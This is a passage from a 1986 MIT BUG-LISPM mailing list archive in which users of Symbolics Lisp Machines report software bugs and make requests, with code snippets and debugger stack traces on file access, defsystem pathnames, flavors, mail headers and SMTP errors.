LispM's.  This software is meant to be used by people who have very
little (or no) knowledge of the workings of a lisp machine.  The
problem we ran into involved trying to make it easy for them to
install the software.  We ended up writing a fairly elaborate piece of
code which would automatically mount all FEP units, look around for
free disk space, and then compute an "installation plan".  This
installation plan would make sure that sufficient paging space was
avaiable, that a LMFS exists (it creates one if necessary, or grows
the existing one if it was too small), that there is enough room for
the world load being distributed, etc.  It then reads the world load
from tape (using READ-FEP-FILES-FROM-TAPE which we wrote--why isn't it
provided?), and finally creates a boot file for the user.

So, what's the problem you say?  The problem is how does the user get
this installation software running on his machine?  We can't
distribute it in distribution format since the user might not have a
LMFS to store the file.  What we ended up doing is sending an
installation tape and telling our users to put it in the local cart
tape drive and type:

(with-open-stream (stream (tape:make-stream :local t)) (read stream))

The format of the tape was:

#.(progn 
    ...
    Place your code here
    ...
   NIL)

With this, we were able to get the installation program executing on
any machine.

The request:  How about a function called INSTALL-SOFTWARE which does
something like the above (with-open-stream ...) stuff.  It should be a
bit more robuts (like checking the tape for a correct header, etc).  A
function like this would make it much easier for our customers to
receive updates of our software, and it is a trivial addition.  I'll
even write it if you want.

Whadayasay?

-- Dinarte R. Morais
25-Feb-86 17:51:08-EST,1427;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Feb 86 17:50-EST
Received: from SNOWBIRD.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 25523; Tue 25-Feb-86 17:49:53-EST
Date: Tue, 25 Feb 86 17:49 EST
From: Carl W. Hoffman <CWH@MIT-ZERMATT.ARPA>
Subject: TCP / DAFile bug?
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860225174904.5.CWH@SNOWBIRD.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12,
6-1-Patches 1.10, MLSite 12.2, Experimental XML 1.11,
Experimental Schema 107.2, microcode TMC5-IO4-ST506-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Snowbird:

Consider the following:

    (with-open-file (s file :direction :input :direct t)
	 (send s :read-bytes n)
	 (loop do (print (multiple-value-list (send s :read-input-buffer)))
		  (send s :advance-input-buffer)))

If N happens to be greater than the length of FILE, and the file server is
being accessed via TCP / NFile, then this will hang indefinitely in
:READ-INPUT-BUFFER after the last buffer of the file has been read.

If the local machine is the file server, then :READ-INPUT-BUFFER returns NIL
after the last buffer of the file has been read, which is what I would expect.
This is also the behavior in the case where N is less than the length of FILE,
for both local and remote file servers.
25-Feb-86 17:54:42-EST,8265;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 25 Feb 86 17:54-EST
Received: from BRECKENRIDGE.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 25524; Tue 25-Feb-86 17:53:20-EST
Date: Tue, 25 Feb 86 17:52 EST
From: Juan Loaiza <jrl@MIT-VAX.ARPA>
Subject: logical pathnames in defsystem
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860225175225.1.JRL@BRECKENRIDGE.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
FORTRAN 49.4, Japanese 24.1, 6-1-Patches 1.10, MLSite 13.0,
microcode TMC5-IO4-ST506-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Breckenridge:

I am losing when using a logical pathname with a ".l" extension in
defsystem. The file I specified was "xml:generic;nmacros.l" but it seems
to tack on a ".lisp" extension anyway. Specifying the same pathname at
the editor or the lisp listener seems to work fine, only inside
defsystem does is seem to bomb out.

						Juan


>>Error: File not found
         For XML: GENERIC; NMACROS.LISP.NEWEST
While in the function (:METHOD FS:HOST-UNIT :COMMAND)  FS:OPEN-CHAOS  (:METHOD FS:QFILE-ACCESS-PATH :OPEN)

(:METHOD FS:HOST-UNIT :COMMAND):  (P.C. = 236)
   Arg 0 (SELF): #<HOST-UNIT 11131066>
   Arg 1 (SYS:SELF-MAPPING-TABLE): FS:HOST-UNIT
   Arg 2 (SI:OPERATION): :COMMAND
   Arg 3 (FS:MARK-P): NIL
   Arg 4 (FS:STREAM-OR-HANDLE): NIL
   Arg 5 (FS:SIMPLE-P): NIL
   Arg 6 (FS:WHOSTATE): "Probe"
   Rest arg (FS:COMMANDS): ("OPEN " :PROBE " " :CHARACTER "" "" "" "" "" "" ...)
   Local 8 (FS:HANDLE): NIL
   Local 9 (FS:STREAM): NIL
   Local 10 (FS:PKT): #<Chaos Packet 105404640>
   Local 11 (FS:SUCCESS): NIL
   Local 12 (STRING): " ERROR FNF C File not found"
   Local 13 (FS:TRANSACTION-ID): "T4570"
   Local 14 (FS:CREATE-P): NIL
   Local 15 (CONDITION): NIL
   Local 16: T
   Local 17: #<CASE-HANDLER 144656741>
   Local 18: NIL
   Local 19: (#<CASE-HANDLER 144656741>)

FS:OPEN-CHAOS:  (P.C. = 674)
   Arg 0 (FS:ACCESS-PATH): #<NORMAL-QFILE-ACCESS-PATH VX using QFILE 11045003>
   Arg 1 (FS:REAL-PATHNAME): #<UNIX42-PATHNAME "VX: //projects//concert//xml//nmacros.lisp">
   Arg 2: #<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.LISP.NEWEST">
   Arg 3 (FS:OPTIONS): (:DIRECTION :PROBE)

(:METHOD FS:QFILE-ACCESS-PATH :OPEN):  (P.C. = 7)
   Arg 0 (SELF): #<NORMAL-QFILE-ACCESS-PATH VX using QFILE 11045003>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:QFILE-ACCESS-PATH -- 4. IV's, 0. FL's 146677221>
   Arg 2 (SI:OPERATION): :OPEN
   Arg 3 (FS:REAL-PATHNAME): #<UNIX42-PATHNAME "VX: //projects//concert//xml//nmacros.lisp">
   Arg 4 (FS:PATHNAME): #<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.LISP.NEWEST">
   Rest arg (FS:OPTIONS): (:DIRECTION :PROBE)

(:METHOD FS:ACTIVE-PATHNAME-MIXIN :OPEN):  (P.C. = 14)
   Arg 0 (SELF): #<UNIX42-PATHNAME "VX: //projects//concert//xml//nmacros.lisp">
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:ACTIVE-PATHNAME-MIXIN -- 1. IV's, 0. FL's 121146543>
   Arg 2 (SI:OPERATION): :OPEN
   Arg 3 (FS:PATHNAME): #<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.LISP.NEWEST">
   Rest arg (FS:OPTIONS): (:DIRECTION :PROBE)

(:DEFUN-METHOD FS:LOGICAL-PATHNAME-PASS-ON):  (P.C. = 10)
   Arg 0 (SELF): #<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.LISP.NEWEST">
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:LOGICAL-PATHNAME -- 8. IV's, 3. FL's 120045753>
   Arg 2 (FS:MESSAGE): :OPEN
   Rest arg (FS:REST): (#<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.LISP.NEWEST"> :DIRECTION :PROBE)

(:METHOD FS:LOGICAL-PATHNAME :OPEN):  (P.C. = 10)
   Arg 0 (SELF): #<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.LISP.NEWEST">
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor FS:LOGICAL-PATHNAME -- 8. IV's, 3. FL's 120045753>
   Arg 2 (SI:OPERATION): :OPEN
   Rest arg (SI:.ARGS.): (#<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.LISP.NEWEST"> :DIRECTION :PROBE)

FS:COMMON-LISP-OPEN:  (P.C. = 450)
   Arg 0 (FS:PATHNAME): #<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.LISP.NEWEST">
   Arg 1 (FS:KEYWORD-ARGS): (:DIRECTION :PROBE)

OPEN:  (P.C. = 257)
   Arg 0 (FS:PATHNAME): #<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.LISP.NEWEST">
   Rest arg (FS:KEYWORD-ARGS): (:DIRECTION :PROBE)

SI:SYSTEM-GET-CREATION-DATE:  (P.C. = 72)
   Arg 0 (SI:FILE): #<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.LISP.NEWEST">
   --Defaulted args:--
   Arg 1 (SI:NO-ERROR-P): NIL

SI:FILE-NEWER-THAN-FILE-P:  (P.C. = 3)
   Arg 0 (SI:FILE-1): #<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.LISP.NEWEST">
   Arg 1 (SI:FILE-2): #<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.BIN.NEWEST">

SI:QUEUE-FILES-AS-NEEDED:  (P.C. = 46)
   Arg 0 (LIST): ((NIL NIL (:COMPILE ("Compile" "Compiling" "compiled") SI:COMPILE-FILE-1 (:LISP) (:BIN)) NIL #<SYSTEM XML 24065454> SI:FILE-NEWER-THAN-FILE-P (#<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.BIN.NEWEST">) #<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.LISP.NEWEST"> #<LOGICAL-PATHNAME "XML: GENERIC; NMACROS.BIN.NEWEST">))

SI:QUEUE-ONE-TRANSFORMATION:  (P.C. = 33)
   Arg 0 (SI:TRANSFORMATION): #<TRANSFORMATION COMPILE 24066316>
   Arg 1 (SI:FORCE-DEPENDENCIES): NIL
   Rest arg (SI:OTHERS): NIL

SI:PERFORM-TRANSFORMATIONS:  (P.C. = 122)
   Arg 0 (SI:TRANSFORMATION-LIST): ((#<TRANSFORMATION COMPILE 24066244> NIL NIL #<SYSTEM XML 24065454>) (#<TRANSFORMATION COMPILE 24066262> NIL NIL #<SYSTEM XML 24065454>) (#<TRANSFORMATION COMPILE 24066300> NIL NIL #<SYSTEM XML 24065454>) (#<TRANSFORMATION COMPILE 24066316> NIL NIL #<SYSTEM XML 24065454>) (#<TRANSFORMATION COMPILE 24066334> NIL NIL #<SYSTEM XML 24065454>) (#<TRANSFORMATION COMPILE 24066352> NIL NIL #<SYSTEM XML 24065454>) (#<TRANSFORMATION COMPILE 24066370> NIL NIL #<SYSTEM XML 24065454>) (#<TRANSFORMATION INCREMENT-COMPILED-VERSION 24066406> NIL NIL #<SYSTEM XML 24065454>))

SI:PERFORM-TRANSFORMATIONS:  (P.C. = 64)
   Arg 0 (SI:TRANSFORMATION-LIST): ((#<TRANSFORMATION FASLOAD 24066253> NIL NIL #<SYSTEM XML 24065454>) (#<TRANSFORMATION FASLOAD 24066271> NIL NIL #<SYSTEM XML 24065454>) (#<TRANSFORMATION FASLOAD 24066307> NIL NIL #<SYSTEM XML 24065454>) (#<TRANSFORMATION FASLOAD 24066325> NIL NIL #<SYSTEM XML 24065454>) (#<TRANSFORMATION FASLOAD 24066343> NIL NIL #<SYSTEM XML 24065454>) (#<TRANSFORMATION FASLOAD 24066361> NIL NIL #<SYSTEM XML 24065454>) (#<TRANSFORMATION FASLOAD 24066377> NIL NIL #<SYSTEM XML 24065454>) (#<TRANSFORMATION INCREMENT-LOADED-VERSION 24066415> NIL NIL #<SYSTEM XML 24065454>))

MAKE-SYSTEM:  (P.C. = 241)
   Arg 0 (SI:SYSTEM): "XML"
   Rest arg (SI:KEYWORDS): (:COMPILE :NOCONFIRM)

(:PROPERTY SI:COM-LOAD-SYSTEM SI:CP-FUNCTION):  (P.C. = 331)
   Arg 0 (SI:SYSTEM-SPEC): #<SYSTEM XML 24065454>
   Local 0 (SI:SYSTEM-SPEC): "XML"
   Arg 1 (SI:AUTOMATIC-ANSWER): NIL
   Arg 2 (COMPILE): :NEW-SOURCE
   Arg 3 (CONDITION): :NEWLY-COMPILED
   Arg 4 (SI:DECLARE-STATUS): NIL
   Arg 5 (SI:NEW-MAJOR-VERSION): :ASK
   Arg 6 (SI:QUERY): :NO
   Arg 7 (SI:SIMULATE): NIL
   Arg 8 (SI:VERSION): :USE-DEFAULT

SI:COM-LOAD-SYSTEM:  (P.C. = 54)
   Arg 0 (SI:SYSTEM-SPEC): #<SYSTEM XML 24065454>
   Rest arg: (:COMPILE :NEW-SOURCE)

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (SI:COM-LOAD-SYSTEM #<SYSTEM XML 24065454> :COMPILE :NEW-SOURCE)
   Local 0 (SI:FORM): NIL
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 500047>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 500054>

SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
   Arg 0 (SI:NAME): "Lisp Top Level"
   Arg 1 (SI:ABORT-FUNCTION): NIL
   Arg 2 (SI:READ-FUNCTION): NIL
   Arg 3 (SI:EVAL-FUNCTION): NIL
   Arg 4 (SI:PRINT-FUNCTION): NIL

SI:LISP-COMMAND-LOOP:  (P.C. = 67)
   Arg 0: #<LISP-LISTENER Lisp Listener 1 43200064 exposed>
   Rest arg: (:NAME "Lisp Top Level")

SI:LISP-TOP-LEVEL1:  (P.C. = 5)
   Arg 0 (SI:STREAM): #<LISP-LISTENER Lisp Listener 1 43200064 exposed>

SI:LISP-TOP-LEVEL:  (P.C. = 7)
26-Feb-86 15:07:20-EST,1350;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 26 Feb 86 15:03-EST
Date: Wed, 26 Feb 86 15:01:06 EST
From: David Vinayak Wallace <GUMBY@MC.LCS.MIT.EDU>
Subject:  header woes
To: BUG-LISPM@MC.LCS.MIT.EDU
Message-ID: <[MC.LCS.MIT.EDU].831488.860226.GUMBY>

Ok.  I sent a test message from OZ, asking that my friend at sally
return it to me.  Here's that message.  Ignoring the "From", note that
the "From:" is un-munged; it's just what OZ claims it is.  So I claim
that it's the lisp machine's fault that my "From:" field was
"Gumby@MIT-MC.ARPA".

---------- Forwarded message follows ----------
From GUMBY%OZ.AI.MIT.EDU@MC.LCS.MIT.EDU Tue Feb 25 07:22:21 1986
Posted-Date: Tue 25 Feb 86 08:21-EST
Received-Date: Tue, 25 Feb 86 07:20:10 cst
Message-Id: <8602251320.AA26264@sally.UTEXAS.EDU>
Received: from OZ.AI.MIT.EDU (MC.LCS.MIT.EDU.ARPA) by sally.UTEXAS.EDU (4.22/4.22)
	id AA26264; Tue, 25 Feb 86 07:20:10 cst
Date: Tue 25 Feb 86 08:21-EST
From: David Vinayak Wallace <GUMBY%OZ.AI.MIT.EDU@XX.LCS.MIT.EDU>
Subject: please forward this to Gumby@MC.LCS.MIT.EDU
To: derrick@SALLY.UTEXAS.EDU
Status: R

Don't use "r" (reply).  I need the header.  The lisp-machine mail people
are claiming that the bug is at your end but I claim it's at ours.

Thanks,
david
------------ End forwarded Message ------------
26-Feb-86 17:38:29-EST,3728;000000000000
Received: from APIARY-3.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 26 Feb 86 17:38-EST
Date: Wed, 26 Feb 86 17:37 EST
From: Hackers of LINGO <SYLPH.LALR@OZ.AI.MIT.EDU>
Subject: default methods
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <"860226173718.1.sylph.lalr@OZ"@APIARY-3.AI.MIT.EDU>

;;; -*- Mode:LISP; Syntax: Common-Lisp; Package: CL-USER

(defmacro make-error (&rest args &key reason &allow-other-keys)
  `(make-instance ,reason ,@args))


(defflavor basic-error
	((class 'unsolvable)
	 (mode 'principal)
	 (reason 'basic-error)
	 theta-role cruft)
	()
  :gettable-instance-variables
  :settable-instance-variables
  :initable-instance-variables)






The following code is directly extracted from a system under
developement here. It seems rather straight forward that "fail"
is a sub-flavor of "basic-error", and a parent flavor to
"local-failure-explanation".
The three macros should simply provide for making instances of each kind
of flavor.
Further down, *b* is setq'ed to be a "fail" with one instance variable ("failed-part")
set to be a "local-failure-explanation".
When *b* is described, all is well. The standard format showing the
contents of each instance variable, among other things, confirms that
"failed-part" both exists, and contains a local-failure-explanation.

When *b* is sent ':failed-part (as shown below as well) the standard
error for unclaimed messages is returned. This is the apparent bug.

*b* was sent most imaginable variations on "failed-part", and always
went unclaimed. This occured for all instance variables defined by the
"fail" flavor.

Sending *b* any instance variable defined in "basic-error" returned the
assigned value without error.

The syntax had been checked repeatedly. This error has occured on two
seperate booted lisp machines. Symbolics release 6.1 . Common lisp.



;;; -*- Mode:LISP; Syntax: Common-Lisp; Package: CL-USER

(defmacro make-error (&rest args &key reason &allow-other-keys)
  `(make-instance ,reason ,@args))


(defflavor basic-error
	((class 'unsolvable)
	 (mode 'principal)
	 (reason 'basic-error)
	 theta-role cruft)
	()
  :gettable-instance-variables
  :settable-instance-variables
  :initable-instance-variables)



(defflavor fail
	((reason 'fail)
	 (success-part nil) (failed-part nil)
	 (untested-part nil) (how-three-parts-combine  nil ))
	(basic-error)
  :initable-instance-variables
  :gettable-instance-variables
  :settable-instance-variables
  )


(defflavor local-failure-explanation
	((test-pattern nil) (desired-pattern nil) (test nil))
	(fail)
  :initable-instance-variables
  :gettable-instance-variables
  :settable-instance-variables
  )

(defmacro make-local-failure-explanation (&rest args &allow-other-keys)
  `(make-error :reason 'local-failure-explanation ,@(copy-list args)))

(defmacro make-failure (&rest args &allow-other-keys)
  `(make-error :reason 'fail ,@(copy-list args)))

#|

no error.

(setq *d* (make-local-failure-explanation ':test-pattern 'a ':desired-pattern 'b
					  ':test 'pattern-match))








looks good.

(describe *d*)







does fine.

(setq *b*  (make-failure ':failed-part (make-local-failure-explanation
						       ':test-pattern 'a ':desired-pattern 'b
						       ':test 'pattern-match)))





real good.

(describe *b*)





lets look more closely at that ':failed-part...
returns an error, unclaimed message ':failed-part.
Flavor inspector freezes after:
(pkg-goto 'cl-user)
(get 'fail 'si:flavor)
 
with error, undefined method set-failed-part.

But *b* is evidence for ... hmmm, ????	

(setq *c* (send *b* ':failed-part))

|# 



27-Feb-86 15:44:42-EST,7685;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 27 Feb 86 15:44-EST
Received: from PI.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 25813; Thu 27-Feb-86 15:23:31-EST
Date: Thu, 27 Feb 86 15:23 EST
From: J. Scott Penberthy <JSP@OZ.AI.MIT.EDU>
Subject: Error when sending mail over arpanet from LISP machines
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860227152319.8.JSP@PI.LCS.MIT.EDU>


When I try to send mail over the arpanet to what used to be the CSNET-RELAY
node, I get the following error.  This has happened on all the LISP machines
on the third floor; they use ZERMATT as a file/namespace server.

The heading to my mail reads as follows:

To:  jsp%yktvmt@ibm-sj				;my acct on an IBM machine
Subject: foo

I found a quick fix by typing (setf (dbg:arg 5) "jsp%mit-oz@mit-mc") in
the top stack frame, which sets the return address to the old format
instead of the new, convoluted format involving all that "...MIT.EDU..."
lossage.  Nevertheless, I wish someone knew how to fix the network or mailer
so this doesn't happen.  It's rather a large pain in the neck.

Good luck.

Scott


--------------------

In Symbolics 3600 Release 6.1, IP-TCP 29.13, Macsyma 318.12,
6-1-Patches 1.10, MLSite 12.2, microcode TMC5-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on PI Project:



>>Error: SMTP error from IBM-SJ: 550 Unknown Host 'PI'
While in the function MAILER:SMTP-CHECK-REPLY  (:METHOD MAILER:SMTP-USER :START-MESSAGE)  (:METHOD MAILER:SMTP-USER :COMBINED :START-MESSAGE)

MAILER:SMTP-CHECK-REPLY:  (P.C. = 172)
   Arg 0 (MAILER:STREAM): #<TCP-ASCII-STREAM 20516304>
   Arg 1 (MAILER:EXPECTED): 250
   Arg 2 (MAILER:TIMEOUT): NIL
   Arg 3 (FORMAT): "~A From:<~A>"
   Rest arg (ARGS): ("MAIL" "@PI.LCS.MIT.EDU:JSP@OZ.AI.MIT.EDU")
   Local 5 (MAILER:REPLY-RECEIVED): T
   Local 6: SYS:UNWIND-PROTECT-TAG
   Local 7: #<DTP-ODD-PC 50127362>
   Local 8: #<DTP-LOCATIVE 44001152>
   Local 9: #<DTP-LOCATIVE 44041050>
   Local 10 (NETI:.TIMER.): 1100
   Local 11: SYS:UNWIND-PROTECT-TAG
   Local 12: #<DTP-ODD-PC 50127370>
   Local 13: #<DTP-LOCATIVE 44001152>
   Local 14: #<DTP-LOCATIVE 44041131>
   Local 15 (MAILER:REPLY): "550 Unknown Host 'PI'"
   Local 16 (MAILER:LINE): "550 Unknown Host 'PI'"
   Local 17 (MAILER:EOF): NIL
   Local 18 (MAILER:NUM): 550
   Local 19 (MAILER:DELIM): 3
   Local 20 (MAILER:ETYPE): (550 MAILER:SMTP-MAILBOX-NOT-FOUND MAILER:MAILER-PERMANENT-ERROR)

(:METHOD MAILER:SMTP-USER :START-MESSAGE):  (P.C. = 17)
   Arg 0 (SELF): #<SMTP-USER 20516327>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor MAILER:SMTP-USER -- 7. IV's, 1. FL's 170753532>
   Arg 2 (SI:OPERATION): :START-MESSAGE
   Rest arg (IGNORE): ((:USER #<USER JSP 43312576>))

(:METHOD MAILER:SMTP-USER :COMBINED :START-MESSAGE):  (P.C. = 17)
   Arg 0 (SELF): #<SMTP-USER 20516327>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor MAILER:SMTP-USER -- 7. IV's, 1. FL's 170753532>
   Arg 2 (SI:.OPERATION.): :START-MESSAGE
   Rest arg (SI:.DAEMON-CALLER-ARGS.): ((:USER #<USER JSP 43312576>))

ZWEI:INVOKE-MAIL-SERVICE:  (P.C. = 61)
   Arg 0 (ZWEI:SERVICE-ACCESS-PATH): #<SERVICE-ACCESS-PATH MAIL-TO-USER (SMTP) -- IBM-SJ on INTERNET 20516255>
   Arg 1 (ZWEI:RECIPIENTS): ((:NAME "jsp%yktvmt" :HOST (:OBJECT #<RANDOM-HOST IBM-SJ 43313557>) :INTERVAL (("To: jsp%yktvmt@ibm-sj" 4) ("To: jsp%yktvmt@ibm-sj" 21))))
   Arg 2 (ZWEI:TEMPLATE-EXPANSION): (:TEXT #<NODE 20516176> :HEADERS (:DATE 2718908194 :FROM ((:USER #<USER JSP 43312576>)) :SUBJECT "foo" :TO ((:NAME "jsp%yktvmt" :HOST ** :INTERVAL **)) :MESSAGE-ID "<860227151634.7.JSP@PI.LCS.MIT.EDU>") :HEADER-FORMAT :INCLUDE-PERSONAL :TRANSMIT-TIME 2718908194 :DRAFT-MSG #<DRAFT-MSG 16402370>)
   Arg 3 (ZWEI:CACHED-UNAVAILABILITY): NIL

ZWEI:NETWORK-SEND-IT-2:  (P.C. = 504)
   Arg 0 (ZWEI:RECIPIENTS): ((:NAME "jsp%yktvmt" :HOST (:OBJECT #<RANDOM-HOST IBM-SJ 43313557>) :INTERVAL (("To: jsp%yktvmt@ibm-sj" 4) ("To: jsp%yktvmt@ibm-sj" 21))))
   Arg 1 (ZWEI:TEMPLATE-EXPANSION): (:TEXT #<NODE 16402306> :HEADERS (:DATE 2718908194 :FROM ((:USER #<USER JSP 43312576>)) :SUBJECT "foo" :TO ((:NAME "jsp%yktvmt" :HOST ** :INTERVAL **)) :MESSAGE-ID "<860227151634.7.JSP@PI.LCS.MIT.EDU>") :HEADER-FORMAT :INCLUDE-PERSONAL :TRANSMIT-TIME 2718908194 :DRAFT-MSG #<DRAFT-MSG 16402370>)

ZWEI:NETWORK-SEND-IT-1:  (P.C. = 415)
   Arg 0 (ZWEI:SERVICES): NIL
   Arg 1 (ZWEI:RECIPIENTS): ((:NAME "jsp%yktvmt" :HOST (:OBJECT #<RANDOM-HOST IBM-SJ 43313557>) :INTERVAL (("To: jsp%yktvmt@ibm-sj" 4) ("To: jsp%yktvmt@ibm-sj" 21))))
   Arg 2 (ZWEI:TEMPLATE-EXPANSION): (:TEXT #<NODE 16402306> :HEADERS (:DATE 2718908194 :FROM ((:USER #<USER JSP 43312576>)) :SUBJECT "foo" :TO ((:NAME "jsp%yktvmt" :HOST ** :INTERVAL **)) :MESSAGE-ID "<860227151634.7.JSP@PI.LCS.MIT.EDU>") :HEADER-FORMAT :INCLUDE-PERSONAL :TRANSMIT-TIME 2718908194 :DRAFT-MSG #<DRAFT-MSG 16402370>)

ZWEI:NETWORK-SEND-IT:  (P.C. = 132)
   Arg 0 (ZWEI:RECIPIENTS): ((:NAME "jsp%yktvmt" :HOST (:OBJECT #<RANDOM-HOST IBM-SJ 43313557>) :INTERVAL (("To: jsp%yktvmt@ibm-sj" 4) ("To: jsp%yktvmt@ibm-sj" 21))))
   Arg 1 (ZWEI:TEMPLATE-EXPANSION): (:TEXT #<NODE 16402306> :HEADERS (:DATE 2718908194 :FROM ((:USER #<USER JSP 43312576>)) :SUBJECT "foo" :TO ((:NAME "jsp%yktvmt" :HOST ** :INTERVAL **)) :MESSAGE-ID "<860227151634.7.JSP@PI.LCS.MIT.EDU>") :HEADER-FORMAT :INCLUDE-PERSONAL :TRANSMIT-TIME 2718908194 :DRAFT-MSG #<DRAFT-MSG 16402370>)

ZWEI:FUNCALL-TEMPLATE-EXPANSION:  (P.C. = 47)
   Arg 0 (ZWEI:TEMPLATE-EXPANSION): (:TEXT #<NODE 16402306> :HEADERS (:DATE 2718908194 :FROM ((:USER #<USER JSP 43312576>)) :SUBJECT "foo" :TO ((:NAME "jsp%yktvmt" :HOST ** :INTERVAL **)) :MESSAGE-ID "<860227151634.7.JSP@PI.LCS.MIT.EDU>") :HEADER-FORMAT :INCLUDE-PERSONAL :TRANSMIT-TIME 2718908194 :DRAFT-MSG #<DRAFT-MSG 16402370>)
   Arg 1 (FUNCTION): ZWEI:NETWORK-SEND-IT
   Rest arg (ARGS): (((:NAME "jsp%yktvmt" :HOST (:OBJECT #<RANDOM-HOST IBM-SJ 43313557>) :INTERVAL (** **))) (:TEXT #<NODE 16402306> :HEADERS (:DATE 2718908194 :FROM (**) :SUBJECT "foo" :TO (**) :MESSAGE-ID "<860227151634.7.JSP@PI.LCS.MIT.EDU>") :HEADER-FORMAT :INCLUDE-PERSONAL :TRANSMIT-TIME 2718908194 :DRAFT-MSG #<DRAFT-MSG 16402370>))

Rest of stack:
(:METHOD ZWEI:BASIC-DRAFT-MSG :TRANSMIT):  (P.C. = 341)
(:METHOD ZWEI:DRAFT-MSG :COMBINED :TRANSMIT):  (P.C. = 44)
ZWEI:COM-SEND-MESSAGE:  (P.C. = 54)
ZWEI:COM-MAIL-END:  (P.C. = 4)
ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
(:METHOD ZWEI:ZMAIL-FRAME :COMBINED :EDIT):  (P.C. = 70)
ZWEI:ZMAIL-MAIL:  (P.C. = 110)
ZWEI:CONTINUE-DRAFT-MSG:  (P.C. = 21)
ZWEI:COMPOSE-VIA-DRAFT-MSG:  (P.C. = 5)
ZWEI:FUNCALL-TEMPLATE-EXPANSION:  (P.C. = 47)
ZWEI:COMPOSE-FROM-TEMPLATE:  (P.C. = 22)
ZWEI:COM-ZMAIL-MAIL:  (P.C. = 11)
ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
ZWEI:ZMAIL-COMMAND-EXECUTE:  (P.C. = 6)
(:METHOD ZWEI:ZMAIL-FRAME :PROCESS-COMMAND-CHAR):  (P.C. = 7)
(:INTERNAL (:INTERNAL (:METHOD ZWEI:ZMAIL-FRAME :COMBINED :PROCESS-COMMAND-CHAR) 0) 0):  (P.C. = 10)
(:METHOD ZWEI:ZMAIL-COMMAND-LOOP-MIXIN :WHOPPER :PROCESS-COMMAND-CHAR):  (P.C. = 21)
(:INTERNAL (:METHOD ZWEI:ZMAIL-FRAME :COMBINED :PROCESS-COMMAND-CHAR) 0):  (P.C. = 13)
(:METHOD ZWEI:ZMAIL-FRAME :WHOPPER :PROCESS-COMMAND-CHAR):  (P.C. = 21)
(:METHOD ZWEI:ZMAIL-FRAME :COMBINED :PROCESS-COMMAND-CHAR):  (P.C. = 12)
(:METHOD ZWEI:ZMAIL-FRAME :COMMAND-LOOP):  (P.C. = 143)
(:METHOD ZWEI:ZMAIL-FRAME :COMBINED :COMMAND-LOOP):  (P.C. = 70)
ZWEI:ZMAIL-PROCESS-TOP-LEVEL:  (P.C. = 105)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
28-Feb-86 15:01:56-EST,915;000000000000
Received: from XX.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Feb 86 15:00-EST
Date: Fri 28 Feb 86 14:58:51-EST
From: Ken Traub <KT@XX.LCS.MIT.EDU>
Subject: Hardcopy broken yet again.
To: bug-lispm@OZ.AI.MIT.EDU
Message-ID: <12187030661.52.KT@XX.LCS.MIT.EDU>

Well, another release has come out, and hardcopy is broken again.
